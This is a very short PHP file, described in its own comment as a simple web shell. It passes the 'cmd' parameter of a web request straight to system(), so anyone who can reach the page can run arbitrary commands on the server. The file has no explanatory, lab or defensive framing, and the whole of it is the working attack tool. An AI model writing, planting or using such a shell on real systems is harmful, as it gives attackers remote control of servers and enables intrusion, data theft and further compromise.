<?php
//A simple PHP web shell

if (isset($_GET['cmd'])) {
    // Run the command passed in the "cmd" parameter
    system($_GET['cmd']);
}
?>
